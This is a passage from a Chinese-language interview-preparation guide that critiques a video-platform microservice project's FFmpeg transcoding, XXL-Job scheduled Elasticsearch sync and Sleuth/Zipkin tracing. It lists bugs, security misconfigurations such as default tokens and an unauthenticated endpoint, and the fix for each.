  2. **🔴 临时文件不清理（成功路径才删）**：
     ```java
     target.delete();
     file.delete();
     // ← 只在「转码成功」的分支里删除
     ```
     - **如果视频是 H264（不需要转码）**，走的是 `if (!rightFormat.equals(decoder))` 的 **else 分支（什么都不做）**——**那么 `file`（下载下来的视频临时文件）永远不会被删除！**
     - **如果中途抛异常**，catch 里只 `e.printStackTrace()`，**临时文件同样残留**。
     - **后果**：`Files.createTempDirectory(".tmp")` 创建的是**系统临时目录下的新目录**（注意 `.tmp` 只是前缀，实际目录名带随机后缀），里面的视频文件**几 MB 到几 GB**。长期运行会**把磁盘写满** → 服务崩溃。**这是很常见的生产事故。**
     - **修法**：用 `try (InputStream in = ...) {}` 或 `try { ... } finally { FileUtils.deleteQuietly(dir); }`，**把临时目录整个删掉**；更规范的是用 `Files.createTempFile` + `deleteOnExit`，或者给临时文件加**定时清理任务**。
  3. **🟠 一次把整个视频流读到磁盘再处理，无流式处理**：
     ```java
     ResponseEntity<Resource> videoInputStream = videoClient.getVideo(uploadVideo);   // Feign 拉流
     Files.copy(videoInputStream.getBody().getInputStream(), Paths.get(file.getAbsolutePath()), REPLACE_EXISTING);
     ```
     - **Feign 拉大文件是通过 HTTP 把整个 body 传过来的**（而且 Feign 默认会缓冲响应体到内存，见第 4 章 Q5），**一个 1GB 视频会造成巨大内存压力 + 网络传输**。
     - **修法**：notice 服务**不应该通过 Feign 拉视频流**，应该**直接用 MinIO 客户端从对象存储读**（`minioClient.getObject()` 返回的是流，可以做流式处理），或者**由 video 服务直接触发转码**（避免视频数据在服务间搬两遍）。**这是架构上的绕路。**
  4. **🟠 转码后「覆盖原对象」，无法回滚**：见 Q1 的追问预警。
  5. **🟠 转码参数过于简单，没有真正的「压缩」**：只设了 `setCodec("h264")`，**没有设码率、分辨率、preset、CRF**。这意味着转码后的文件**体积可能比原文件还大**（H.265 转 H.264 在同码率下质量更差，但如果不控制码率，FFmpeg 会用默认 CRF 23，体积可能膨胀）。**如果简历写了「压缩」，这里就是被追问的点。** 正确的压缩参数应该显式设：
     ```java
     videoAttrs.setCodec("h264");
     videoAttrs.setBitRate(1500 * 1000);                  // 1.5 Mbps
     videoAttrs.setSize(new VideoSize(1280, 720));        // 720p
     videoAttrs.setPreset("medium");                      // 编码速度 vs 压缩率
     // 也可以用 CRF（恒定质量）而不是固定码率
     ```
  6. **🟠 `catch (Exception e) { e.printStackTrace(); }` 吞异常 → MQ 不重试**（与第 9 章 Q4 同源）：转码失败的消息**被标记为消费成功**，用户投稿的视频**永远是坏的**且没人知道。这是**最严重的一条**。
  7. **🟡 文件类型/大小/时长无校验**：转码前不检查「文件是不是真的视频」「时长是否超长」（比如有人上传 10 小时视频，转码会占满机器）。**应该有上传大小和时长的上限校验。**
  8. **🟡 没有转码并发控制（跨实例）**：`video` 模块里那个 `encode-count` 想做的就是这个（但实现是坏的，见第 6 章）。**notice 服务如果起多个副本，MQ 会并发消费多条转码消息**，多个 FFmpeg 同时跑会**把 CPU 打满**，影响同机器上的其他服务。

**Q5 [进阶] 如果让你实现「去水印」和「压缩」，你怎么做？**

- **考点**：**简历写了但没实现，这题就是来验证的。答好了能把减分项变加分项。**

- **答**：
  - **先说定位**：
    - **压缩**：在 `VideoAttributes` 上设参数即可，属于**转码的延伸**：
      ```java
      videoAttrs.setCodec("h264");
      videoAttrs.setBitRate(800_000);                 // 目标码率
      videoAttrs.setSize(new VideoSize(1280, 720));   // 目标分辨率
      videoAttrs.setPreset("slow");                   // 越慢压缩率越高
      // 或恒定质量：视频用 CRF，音频用固定码率
      ```
      **但要讲清取舍**：固定码率（CBR/ABR）**码率可控、文件大小可预测**，适合流媒体；CRF **质量稳定**但大小不可预测。工业做法是**多档转码**（360p/480p/720p/1080p 各一档 + HLS 切片 + m3u8 索引），前端按网速切换。**这才是 B 站真正的做法**，而我项目里只有单档。
  - **去水印**：FFmpeg 层面有三类做法（**难度和合法性差别很大，必须讲清**）：
    1. **`delogo` 滤镜（遮盖/模糊）**：
       ```
       ffmpeg -i in.mp4 -vf "delogo=x=10:y=10:w=200:h=80" out.mp4
       ```
       原理是**用周围像素插值填补指定矩形区域**。JAVE 里可以通过自定义 `EncodingAttributes` 传滤镜参数（或用 `jave` 的 `-vf` 支持）。
       - **局限**：① **水印位置必须固定**（动态移动的水印无法处理）；② 插值填充会**留下明显的模糊块**；③ **需要预先知道水印坐标**。
    2. **`crop` / `drawbox` 裁剪或覆盖**：直接把水印区域裁掉或画一个纯色块盖住。**简单粗暴，但会损失画面内容。**
    3. **基于深度学习的 inpainting（真正意义的"去水印"）**：用模型（如 STTN、E2FGVI）逐帧重建被水印遮挡的区域。**效果最好但要 GPU + 逐帧推理，成本和复杂度极高。**
  - **⚠️ 更重要的一层：合法性与平台责任**（**这个角度一定要说，能立刻体现你的成熟度**）
    - 用户上传的视频如果带**他人版权水印**（如其他平台 logo），去水印涉及**著作权侵权**（可能构成「破坏技术措施」）；
    - 平台方对用户上传内容有**注意义务**，提供「一键去水印」功能可能被认定为**帮助侵权**。
    - **所以我的判断是**：这个能力**不应该作为通用功能对所有用户开放**。如果业务真的需要，正确的做法是：① 只处理**用户自己声明拥有版权**的内容（配合版权声明与后果承担条款）；② 或者**只做平台内可控的水印（如加自己的台标）**，而不是去别人的水印。
  - **收尾（诚实的自我定位）**：
    > 「所以关于这一项，我的准确表述应该是：**我实现了基于 JAVE/FFmpeg 的转码、截帧和时长提取；压缩属于参数没配全（设码率和分辨率即可）；去水印我调研过 `delogo` 和深度学习 inpainting 两条路，但因为『平台提供去水印功能的合规风险』我没有实现它。简历上那行是我写得不够准确，应该改成『视频转码 / 封面截帧 / 元信息提取』。**」

**Q6 [进阶] 为什么 courrence 两处都在截帧？重复了吗？**

- **答**：
  - **两处截帧的触发条件不同，是「主 + 兜底」的设计**：
    1. **`video` 模块（主）**：`uploadPart` 里在**第一个分片到达时**截帧，把封面 **Base64 存进内存 map**，合并完成后**返回给前端**让用户确认/预览。
    2. **`notice` 模块（兜底）**：`VideoEncodeConsumer` 里，**只有当 `uploadVideo.getHasCover() == false`（用户没上传自定义封面）时**才截帧，然后通过 Feign 回传 `video` 服务上传到 MinIO 的 `video-cover` bucket，并**同步更新 `video.cover` 和已生成的 `dynamic.video_cover`**（`VideoEncodeConsumer:93-105`）。
  - **所以逻辑上是**：**用户有自定义封面 → 用用户的；没有 → 用转码时截的帧**。**这个设计是合理的。**
  - **但实现上有三个问题**：
    1. **🟠 浪费一次计算**：`video` 模块在首片时**无条件截帧**（不管用户会不会上传自定义封面）。如果用户最终上传了自己的封面，**第 1 处截的帧就被丢弃了**（而且它一直占着内存等合并完成）。**应该在「合并完成且用户没有自定义封面时」才截帧。**
    2. **🟠 两处截帧逻辑重复但参数一致**（都是 `1000ms`、`-1,-1`），**没有抽公共方法**。改进：抽一个 `VideoCoverUtils.extractCover(File video, long atMillis)`。
    3. **🟠 第 2 处要「回传更新已有数据」**，说明**封面是在视频记录创建之后才确定的**——这引入了**两次写 `video.cover`**（投稿时写 Base64 或占位，转码时再覆盖）。加上第 11 章提到的 `MyMetaObjectHandler` 把封面覆盖成默认头像的那个 bug（FIX-14），**封面这个字段被多个地方写，是数据一致性的高风险点**。

### 19.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **简历写了「压缩/去水印」但代码里不存在** | 全项目 | 🟠 高 | 见 Q5 的话术修正 |
| **转码同步阻塞 + 无超时，占住 MQ 消费线程** | `VideoEncodeConsumer:149` | 🔴 致命 | 独立线程池 + FFmpeg 超时 |
| **临时文件只在成功路径删除 → 磁盘写满** | `VideoEncodeConsumer:156-157` | 🔴 致命 | `finally` 删除整个临时目录 |
| **`catch` 吞异常 → 转码失败不重试** | `VideoEncodeConsumer:159-161` | 🔴 致命 | 抛异常交给 MQ 重试 |
| **转码产物覆盖原对象，无法回滚** | `VideoEncodeConsumer:151-154` | 🟠 高 | 新对象名 + 校验后切 DB 指针 |
| **用 Feign 拉整个视频流（大文件内存/网络压力）** | `VideoEncodeConsumer:81` | 🟠 高 | notice 直连 MinIO 流式读取 |
| 转码参数只有 codec，无码率/分辨率（没真压缩） | `VideoEncodeConsumer:139-147` | 🟡 中 | 设 bitRate/size/preset 或 CRF |
| 截帧固定第 1000ms，黑帧/短视频场景不佳 | `UploadAndEditServiceImpl:310`、`VideoEncodeConsumer:96` | 🟡 中 | 按比例 + 黑帧检测 / `thumbnail` 滤镜 |
| 首片截帧并发下会重复截（无同步） | `UploadAndEditServiceImpl:297` | 🟡 中 | 移到合并后 & 加锁 |
| 时长格式化手写 18 行嵌套 if | `VideoEncodeConsumer:109-127` | 🟢 低 | `Duration` / Hutool |
| 无文件大小/时长上限校验 | 上传 & 消费两端 | 🟠 高 | 加上限校验 |
| `jave-all-deps` 使镜像 260MB | `java/pom.xml:117-121` | 🟡 中 | 改 `jave-core` + 镜像装 FFmpeg |
| **上传位置：`uploadPartMap` 并发问题同样影响截帧** | 见第 10 章 | 🟠 高 | 见第 10 章 |

---

## 第 20 章 XXL-Job —— 分布式可视化定时任务

### 20.1 在这个项目里它扮演什么角色

**一句话**：XXL-Job 是这个项目**唯一的调度中枢**，它驱动着「**MySQL → Elasticsearch 数据同步**」这条核心链路的**最后一环**。

**在这个项目里的具体位置**

```
video/notice/gateway 服务：写库 → 发 MQ "mysqlToEs"
        ↓
notice.MysqlToEsConsumer：消费 → rightPush 到 5 个 Redis List
        ↓  （add:video / delete:video / update:video / add:user / update:user）
★ search.MysqlToEsHandler.@XxlJob("mysqlToEs")：定时捞取 Redis List → ES bulk 写入 ★
        ↓
ES 索引更新完成
```

**配置**（`search/application.yml`）
```yaml
xxl:
  job:
    admin:
      addresses: http://localhost:8080/xxl-job-admin
    accessToken: default_token
    executor:
      port: 9916
      appname: demo-service-impl
      logpath: /data/applogs/xxl-job/jobhandler
```
**执行器配置类**（`search/config/XxlJobConfig.java`）
```java
@Configuration
public class XxlJobConfig {
    @Value("${xxl.job.admin.addresses}") private String adminAddresses;
    @Value("${xxl.job.accessToken}")     private String accessToken;
    @Value("${xxl.job.executor.appname}") private String appname;
    @Value("${xxl.job.executor.port}")    private int port;
    @Value("${xxl.job.executor.logpath}") private String logPath;

    @Bean
    public XxlJobSpringExecutor xxlJobExecutor() {
        XxlJobSpringExecutor executor = new XxlJobSpringExecutor();
        executor.setAdminAddresses(adminAddresses);
        executor.setAppname(appname);
        executor.setPort(port);
        executor.setAccessToken(accessToken);
        executor.setLogPath(logPath);
        return executor;
    }
}
```
**任务实现**（`search/handler/MysqlToEsHandler.java`）
```java
@XxlJob("mysqlToEs")
public void mysqlToEsHandler() throws Exception {
    // ① 首次执行做全量同步（用两个 static 标志位控制，只做一次）
    if (!hasSynchronousVideo) { mysqlToEsService.videoMysqlToEs(); mysqlToEsService.updateVideoData(); hasSynchronousVideo = true; }
    if (!hasSynchronousUser)  { mysqlToEsService.userMysqlToEs();  mysqlToEsService.updateUserData();  hasSynchronousUser = true; }
    // ② 从 Redis List 捞增量变更
    List<...> videoAddList    = redis.opsForList().range(VIDEO_ADD_KEY, 0, -1);
    List<...> videoDeleteList = redis.opsForList().range(VIDEO_DELETE_KEY, 0, -1);
    // ... 共 5 个 List
    // ③ 按「先增删、后修改」的顺序同步
    if (!videoAddList.isEmpty())    mysqlAddToEs("add",    videoAddList,    "video");
    if (!videoDeleteList.isEmpty()) mysqlAddToEs("delete", videoDeleteList, "video");
    // ...
    // ④ 清空已消费的 List
    redis.delete(VIDEO_ADD_KEY); redis.delete(VIDEO_DELETE_KEY); /* ... */
}
```

### 20.2 高频问答

**Q1 [必答] 为什么用 XXL-Job？和 `@Scheduled` / Quartz 有什么区别？**

- **答**（三段，**对比表是这题的核心**）：
  - **① 项目里解决什么**：我需要把「MySQL 的变更同步到 ES」。这个动作**不适合在业务请求里同步做**（ES 可能慢、可能失败），所以设计成「业务只把变更写进 Redis List，由一个**定时任务**周期性地批量同步」。这里的关键需求是：**① 任务要能集中管理和监控（看不到执行历史和失败原因就没法运维）；② search 服务如果多副本，任务不能重复执行（重复执行会重复写 ES）；③ 失败要能重试、能告警、能手动触发**。
  - **② 三种方案对比**：
    | 维度 | **XXL-Job** | Spring `@Scheduled` | Quartz |
    |---|---|---|---|
    | **可视化控制台** | ✅ **有（任务列表、执行日志、手动触发、启停）** | ❌ 无，改 cron 要改代码重启 | ❌ 无（要自己写） |
    | **执行日志** | ✅ **自动记录每次执行的结果与耗时，可在线看** | ❌ 只能看应用日志 | ⚠️ 要自己落库 |
    | **动态改 cron** | ✅ **控制台改，实时生效** | ❌ 改代码重启 | ⚠️ 要写 API |
    | **失败重试** | ✅ **内置（可配重试次数）** | ❌ 要自己写 | ⚠️ 需配置 |
    | **告警** | ✅ **内置邮件告警** | ❌ | ❌ |
    | **分片广播** | ✅ **内置（`shardIndex`/`shardTotal`）** | ❌ | ❌ |
    | **路由策略** | ✅ **丰富（轮询/故障转移/分片/一致性哈希）** | ❌ | ⚠️ 需自写 |
    | **多实例防重复** | ✅ **调度中心统一触发，只发一台执行器** | ❌ **所有实例都会执行！** | ✅ 靠 DB 锁 |
    | 依赖 | 需部署调度中心（admin）| 零依赖 | 需 DB 表 + 配置 |
    | 适用 | **分布式生产环境** | 单机小任务 | 传统企业应用 |
    
    **决定性理由是「多实例防重复」和「可视化」**：`@Scheduled` 在**多副本部署时每个副本都会跑一遍**——search 服务起 2 个副本，`mysqlToEs` 就会**同时被两个实例执行**，两边都去 `range` 同一个 Redis List 然后都 `bulk` 写 ES，**产生重复写入和竞态**。而 XXL-Job 的**调度中心是单一决策点**，按路由策略（默认 FIRST）只选一台执行器执行。**这是分布式定时任务最核心的价值。**
  - **③ 代价**：
    1. **多一个组件要运维**（admin + 自己的 DB 表）；admin 挂了就**不能触发新任务**（已触发的仍会跑）；
    2. **`accessToken` 是明文共享密钥**（项目里是 `default_token`），需要保护好；
    3. **admin 的 8080 端口暴露就是任务执行入口**，必须加认证（XXL-Job 默认登录账号 `admin/123456`，**生产必须改**）。

**Q2 [必答] 你项目里的定时任务配置在哪？cron 是什么？**

- **考点**：**这题是一个陷阱——很多人会答不上来，因为它根本不在代码里。**

- **答**（**必须诚实，而且要讲清这暴露的问题**）：
  - **代码里只有「任务处理器」，没有「cron 表达式」**：
    - `@XxlJob("mysqlToEs")` 只是**注册了一个执行器 handler**（告诉调度中心「我这有个叫 mysqlToEs 的任务可以执行」）；
    - **真正的触发规则（cron、路由策略、重试次数、告警邮箱）全部存在 XXL-Job 的 DB 表 `xxl_job_info` 里，需要在 admin 控制台手工创建**。
  - **我核对过仓库里的 `docker/mysql/init/03-xxl-job.sql`**：里面只有 XXL-Job 的**建表语句 + 一条自带的示例任务**：
    ```sql
    INSERT INTO xxl_job_info(... executor_handler, schedule_conf ...) 
    VALUES (1, 1, '测试任务1', ..., 'CRON', '0 0 0 * * ? *', ..., 'demoJobHandler', ...);
    ```
    **这是 XXL-Job 官方自带的示例任务（`demoJobHandler`，cron 是每天 0 点），不是我的 `mysqlToEs`**。
  
  > **所以结论是：`mysqlToEs` 这个任务在代码里有 handler，但在仓库里没有 cron 定义——它的调度配置是「运行期资产」，需要人工在 admin 页面创建。**
  >
  > **⚠️ 这是一个严重的「环境依赖没有固化」问题**：别人 clone 我的项目，即使把中间件都起起来，**ES 同步任务也不会跑**（因为没人在 admin 里建任务），表现为「搜索永远是空的」，而且**没有任何报错**——因为任务不存在，自然不会执行。
  >
  > **正确做法**：
  > 1. **把任务定义纳入 SQL 初始化脚本**（像现在这样建表，但补上 `INSERT INTO xxl_job_info` 插入 `mysqlToEs` 任务，cron 比如 `0/30 * * * * ?` 每 30 秒一次）；
  > 2. 或者用 XXL-Job 的 **OpenAPI**（`/api/jobinfo/add`）在应用启动时**幂等注册任务**（`XxlJobSpringExecutor` 启动后调用 `/api/jobinfo/pageList` 检查存在性再 add）；
  > 3. 至少要**在 README 和 docker 部署文档里明确写出「需要在 admin 创建任务，cron = xxx，handler = mysqlToEs」**（项目文档里确实有提到，但这属于「文档兜底」，不如脚本固化）。
  
  - **面试时怎么讲这题**（**把陷阱变成加分项**）：
    > 「这里要区分两个概念：**`@XxlJob("mysqlToEs")` 是执行器侧的 handler 注册，cron 是调度中心侧的触发配置**，两者分离是 XXL-Job 的设计特点。我的问题是只固化了前者——仓库里只有 handler 和 admin 的建表语句，`xxl_job_info` 里没有 `mysqlToEs` 这条记录，所以**任务需要在 admin 控制台手工创建**。这导致部署不可复现：新人拉起环境后搜索是空的，而且不报错。**修法是把任务定义写进初始化 SQL，或者应用启动时用 OpenAPI 幂等注册。**」

**Q3 [进阶] XXL-Job 的架构原理讲一下。**

- **答**：
  ```
   ┌─────────────────┐         ┌──────────────────────────────┐
   │  调度中心 Admin  │ ──①注册──│  执行器 Executor（search 服务）│
   │  （独立部署）     │ ──②调度──│  XxlJobSpringExecutor         │
   │  · 任务管理      │         │  · 注册到 admin（心跳 30s）    │
   │  · cron 解析     │ ←──③回调─│  · 接收调度请求执行 handler    │
   │  · 执行日志      │         │  · 上报执行结果               │
   └─────────────────┘         └──────────────────────────────┘
  ```
  1. **注册**：执行器启动时（`XxlJobSpringExecutor`）把自己的 `appname` + `ip:port` 注册到 admin（`/api/registry`），并**每 30 秒发送心跳**（`/api/registryBeat`）；
  2. **调度**：admin 内部有一个**时间轮（Time Wheel）**线程 `JobScheduleHelper`，按任务 cron 算出下次触发时间，到点后**按路由策略从该 appname 的执行器列表中选一台**，通过 **HTTP（`/run`）** 发起调度（默认走 Netty，也可配 HTTP）；
  3. **执行**：执行器收到请求后**丢进自己的业务线程池**（`XxlJobExecutor` 的 `jobThreadRepository`，**同一个任务串行、不同任务并行**），执行对应的 `@XxlJob` 方法；
  4. **回调**：执行完成后**回调 admin 上报结果**（成功/失败/耗时/traceId），写入 `xxl_job_log`；
  5. **容错**：admin 会做**任务超时检测**（`executor_timeout`）、**失败重试**（`executor_fail_retry_count`）、**故障转移**（`executor_route_strategy=FAILOVER` 时失败后换一台重试）；执行器有**注册线程**定期上报、**日志清理线程**定期删旧日志文件。
  - **两个关键设计点要讲**：
    1. **「调度中心与执行器解耦」**：admin 不执行任务代码，只发 HTTP 触发。所以**执行器集群可以随意扩缩容**，admin 只维护注册列表；**admin 宕机不影响已注册的执行器（但无法触发新调度）**。
    2. **通信是双向的**：注册和回调是「执行器 → admin」，调度是「admin → 执行器」。**所以要保证 admin 能访问执行器的 `9916` 端口**（我项目里在容器里标注了「仅内部 expose」）。

**Q4 [深挖] 这个定时任务有什么问题？**

- **答**（逐条，**这是本章最关键的部分**）：

  1. **🔴 `range` + `delete` 非原子 → 丢消息**（**已在第 6 章 Q4 详细讲过，这里再点一次**）：
     ```java
     List<...> videoAddList = redis.opsForList().range(VIDEO_ADD_KEY, 0, -1);   // 取
     // ... 中间做 bulk 写 ES（可能耗时几秒）...
     redis.delete(VIDEO_ADD_KEY);                                              // 删
     ```
     **在这两步之间新 push 的消息会被删掉但从未同步**。应该用 `RPOPLPUSH` 或 **Lua 脚本原子地「取空」**。

  2. **🔴 `hasSynchronousVideo` 用 `static Boolean` 做「只全量一次」的标志 → 多实例/重启问题**：
     ```java
     private static Boolean hasSynchronousVideo = false;   // ← 静态内存标志
     ```
     - **多实例时每个副本都是 `false`**（各自的内存），所以**两个副本都会做全量同步**；
     - **search 服务重启后标志重置为 true→false，会再全量同步一次**（如果任务在两个实例间轮询触发，每次重启都全量）；
     - **更糟的是这个标志不受任务调度方式影响**：如果 admin 配置了**分片广播**，两个实例同时全量同步，**各自独立地 `UPSERT` 全表**，做了双倍工作。
     - **正确做法**：全量同步应该**用「状态标记在外部」**（Redis key 或 DB 表记录 `last_full_sync_time`），并且**用 `@XxlJob` 的分片参数或分布式锁保证只有一个实例执行**；更规范的是**全量同步做成一个独立的一次性任务**（或使用「幂等 + 可重入」的全量逻辑，跑多少次结果都一致——**因为用的是 `docAsUpsert`，其实已经幂等了，重复跑只是浪费资源而不产生错误**，这一点可以说明我已经有了幂等基础）。

  3. **🔴 任务失败仍然返回「成功」**：`mysqlAddToEs` 里重试 10 次后**返回 true**，异常也被 `MysqlToEsHandler` 的方法签名 `throws Exception` 抛给 XXL-Job（这点是对的），**但 `bulkOpreateUntilAllSucess` 重试耗尽后 `return true`**，导致 **XXL-Job 记录 `handle_code=200`（成功）**，操作者以为同步好了。**而 Redis List 已经被删，失败的文档永远不会再同步。**
     - **修法**：重试耗尽后**返回失败 / 抛异常**，让 XXL-Job 记录失败并触发**告警 + 自动重试**（XXL-Job 支持 `executorFailRetryCount`）。

  4. **🟠 「全量 + 增量」混在一个任务里，职责不清**：
     - 任务里先判断是否全量、再做增量，**两件事的执行频率需求完全不同**：全量是「部署后跑一次」，增量是「每 30 秒一次」。混在一起导致：**每 30 秒执行一次的任务里，每次都要判断两个 static 标志位**（开销小，但语义混乱），而且**全量同步慢（可能几分钟）会把那次增量同步阻塞住**。
     - **修法**：拆成两个任务——`mysqlToEsFullSync`（一次性/手动触发）和 `mysqlToEsIncremental`（高频 cron）。**任务粒度应该对应「一个独立的业务意图」。**

  5. **🟠 任务执行时间可能超过 cron 间隔（任务重叠）**：
     - 如果 `mysqlToEs` 执行需要 40 秒，而 cron 是每 30 秒一次，**就会出现任务堆积**。XXL-Job 的默认策略是 `SERIAL_EXECUTION`（**同任务串行，前一次没跑完后一次排队**），所以不会并发，**但会「任务延迟累积」**。
     - **修法**：① 调大 cron 间隔；② 显式配 `executor_block_strategy = DISCARD_LATER`（丢弃后续）或 `COVER_EARLY`；③ 优化任务本身（`bulk` 批大小、并发）。
     - **加分句**：**「XXL-Job 的 `executor_block_strategy` 是很容易被忽略的配置。默认 `SERIAL_EXECUTION` 在高频任务里会导致任务队列堆积，形成『越跑越慢』的雪崩。这里必须根据任务的幂等性和实时性要求明确选择丢弃还是覆盖。」**

  6. **🟠 无分片广播 → 大表全量同步是单点**：
     - 全量同步（`videoMysqlToEs`）是**单线程逐条 `client.index()`**（注意：不是 bulk！）：
       ```java
       // MysqlToEsServiceImpl.userMysqlToEs —— 逐条 index，没有用 bulk
       for (Map<String, Object> map : userMap) {
           IndexRequest indexRequest = new IndexRequest("user");
           client.index(indexRequest, RequestOptions.DEFAULT);   // ← 每条一次网络往返！
       }
       ```
       **而 `updateVideoData` / `updateUserData` 用的是 `bulk`**（`BulkRequest`）。**同一个类里两种写法，全量部分没用 bulk，性能差一个量级。**
     - **改进**：① 全量也改 `bulk`（每批 500-1000 条）；② 用 XXL-Job 的**分片广播**（`XxlJobHelper.getShardIndex()/getShardTotal()`）把用户按 `id % shardTotal` 分片，每个副本同步一部分，**全量时间线性缩短**。
       ```java
       @XxlJob("mysqlToEsFullSync")
       public void fullSync() {
           int shardIndex = XxlJobHelper.getShardIndex();
           int shardTotal = XxlJobHelper.getShardTotal();
           // 只同步 id % shardTotal == shardIndex 的数据
       }
       ```
     - **这就是 `executor_route_strategy = SHARDING_BROADCAST` 的用法**，是 XXL-Job 相对 `@Scheduled` 的核心优势之一。

  7. **🟠 无任务执行监控/告警**：
     - 项目里**没有配置告警邮箱**（`alarm_email` 为空），任务失败/超时**不会通知任何人**。
     - **修法**：在 admin 里配任务级告警邮箱，或者接企业微信/钉钉机器人；**关键指标**：执行成功率、执行耗时趋势、同步条数（**同步条数突然掉到 0 说明上游链路断了**）。

  8. **🟠 `accessToken` 用默认值 `default_token`**：
     - 这是**执行器与 admin 之间的共享密钥**，用于防止「任意人伪造调度请求触发执行器」。用默认值意味着**任何人只要知道执行器 IP:9916，就能直接触发任务执行**（XXL-Job 2.2+ 校验 token，老版本甚至不校验）。
     - **修法**：改成强随机字符串，两侧配置一致，**通过环境变量注入**（不进 Git）。
     - **同时**：admin 的默认登录 `admin/123456` **必须改**，而且 admin 控制台**不应该暴露到公网**（只允许运维网段访问）。

  9. **🟡 `logpath: /data/applogs/xxl-job/jobhandler`**：在 Windows 本地开发时这个路径不存在，可能导致日志写入失败（XXL-Job 会自动创建，但在某些权限受限的容器里会失败）。**容器里需要挂载可写卷或将路径配置化。**

  10. **🟡 搜索模块还有 `GET /search/test` 把这个定时任务暴露成了 HTTP 接口**（我核对过 `SearchController` 里有这个映射）——**这意味着任何人可以无鉴权地手动触发全量同步**！这是个真实的**未授权访问 + 资源耗尽**风险（全量同步会大量读写 ES 和 MySQL）。
      - **修法**：删掉这个测试接口，或者加严格鉴权（只允许运维/内网），**并且它本来就不应该存在**（定时任务应该由 XXL-Job admin 触发，不是 HTTP 接口）。

### 20.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **仓库里没有 `mysqlToEs` 的 cron，任务需人工在 admin 创建** | `03-xxl-job.sql` 只有 `demoJobHandler` | 🟠 高 | 写进初始化 SQL 或用 OpenAPI 幂等注册 |
| **`GET /search/test` 无鉴权暴露定时任务触发** | `SearchController` | 🔴 致命 | 删除该接口 / 加严格鉴权 |
| **`range`+`delete` 非原子 → 丢消息** | `MysqlToEsHandler:62-103` | 🔴 致命 | `RPOPLPUSH` / Lua 原子取空 |
| **重试耗尽仍返回 true → 失败不告警** | `MysqlToEsHandler:213-230` | 🔴 致命 | 返回失败 / 抛异常 |
| **`static Boolean` 做全量标志 → 多实例重复全量** | `MysqlToEsHandler:42-43` | 🟠 高 | 状态外置（Redis/DB）+ 分片或分布式锁 |
| **全量同步逐条 `client.index()`，未用 bulk** | `MysqlToEsServiceImpl:61-67,90-95` | 🟠 高 | 改 `BulkRequest` 分批 |
| 无分片广播，全量同步单点 | 无 `getShardIndex` 使用 | 🟡 中 | `SHARDING_BROADCAST` + 按 id 取模 |
| 全量与增量混在一个任务 | `MysqlToEsHandler` | 🟡 中 | 拆成两个任务 |
| 无告警配置（`alarm_email` 空） | 任务定义 | 🟠 高 | 配邮件/企微告警 + 耗时趋势监控 |
| **`accessToken` 用默认 `default_token`** | `search/application.yml` | 🟠 高 | 强随机 + 环境变量注入 |
| admin 默认口令 `admin/123456` 且可能公网暴露 | 部署 | 🟠 高 | 改口令 + 限制访问网段 |
| 任务重叠与阻塞策略未显式配置 | 任务定义 | 🟡 中 | 按幂等性选 `block_strategy` |
| `logpath` 在 Windows/受限容器不可写 | `application.yml` | 🟢 低 | 配置化 + 挂载卷 |

---

## 第 21 章 Sleuth + Zipkin —— 请求链路追踪

### 21.1 在这个项目里它们扮演什么角色

**一句话**：**Sleuth 负责「埋点和传递」，Zipkin 负责「存储和可视化」**——两者配合，把一次跨 6 个服务的请求串成一条完整链路。

**分工**

| 组件 | 职责 | 类比 |
|---|---|---|
| **Spring Cloud Sleuth** | ① **生成 traceId / spanId**；② **在服务间传递**（通过 HTTP header `X-B3-TraceId`/`X-B3-SpanId`/`X-B3-ParentSpanId`/`X-B3-Sampled`，Feign 自动透传）；③ **按采样率决定是否上报**；④ **把 traceId 打进日志（MDC）** | **探针 + 信封** |
| **Zipkin Server** | ① **接收**上报的 span；② **存储**（内存/ES/MySQL/Cassandra）；③ **提供 UI 展示调用链、耗时、依赖拓扑** | **档案馆 + 展示台** |

**项目配置**（每个服务都有）
```yaml
spring:
  zipkin:
    base-url: http://localhost:9411     # Zipkin 服务地址
    sender:
      type: web                          # 通过 HTTP 上报
    sleuth:
      sampler:
        probability: 1                   # ⚠️ 采样率 —— 这个层级写错了！见 Q4
```

**依赖**（`java/common/pom.xml:77,81`，所以 6 个服务都有）
```xml
<artifactId>spring-cloud-starter-sleuth</artifactId>
<artifactId>spring-cloud-starter-zipkin</artifactId>   <!-- 版本 2.2.2.RELEASE -->
```

### 21.2 高频问答

**Q1 [必答] 为什么要做链路追踪？**

- **答**（三段）：
  - **① 项目里解决什么**：我的架构是**微服务 + 异步消息**，一次用户请求可能横跨 6 个服务：
    ```
    用户点「投稿」→ gateway → video(分片上传) → Feign → notice → RocketMQ
                                                     ↓
                                    notice 消费 → Feign → video(拉视频流/回传)
                                                     ↓
                                              Feign → video → MinIO
                                                     ↓
                                            RocketMQ "mysqlToEs" → Redis → xxl-job → ES
    ```
    **当这个链路出问题时**（用户说"投稿了但搜不到"，或者"接口偶尔很慢"），只看单个服务的日志**根本无法定位**：
    - 「哪一步慢了？」→ 需要**每个 span 的耗时**；
    - 「这次请求经过了哪些服务？」→ 需要**调用关系图**；
    - 「A 服务的日志和 B 服务的日志怎么关联？」→ **需要 traceId**。
  - **② Sleuth + Zipkin 具体给了什么**：
    1. **traceId 贯穿全链路**：同一个 traceId 在 6 个服务的日志里都能 grep 到，**这是最实用的功能**——出问题直接 `grep traceId` 就能把全链路日志捞出来；
    2. **耗时瀑布图**：Zipkin UI 能看到每个 span 的起止时间和耗时，**一眼看出瓶颈在哪个环节**；
    3. **依赖拓扑图**：Zipkin 的 Dependencies 页能画出服务间的调用关系，**架构可视化**；
    4. **错误标记**：失败的 span 会标红，能快速定位失败环节。
  - **③ 和日志、指标的关系（可观测性三支柱）**：
    | 支柱 | 回答什么问题 | 项目里的工具 |
    |---|---|---|
    | **Logging（日志）** | **发生了什么** 具体事件 | Logback（`logback-spring.xml`，按 module 分目录） |
    | **Tracing（链路）** | **这次请求经过了哪里、慢在哪** | **Sleuth + Zipkin** |
    | **Metrics（指标）** | **整体趋势和容量**（QPS、P99、错误率） | **项目里缺失**（建议 Micrometer + Prometheus + Grafana） |
    - **三者互补**：指标告诉你「**有问题**」（P99 飙高），链路告诉你「**哪个环节有问题**」（ES bulk 慢），日志告诉你「**为什么有问题**」（某个文档字段类型冲突）。

**Q2 [必答] Sleuth 的原理讲一下？traceId 是怎么传递的？**

- **答**：
  1. **概念模型**（Google Dapper 论文的模型）：
     - **Trace（链路）**：一次完整请求，由唯一 **traceId** 标识；
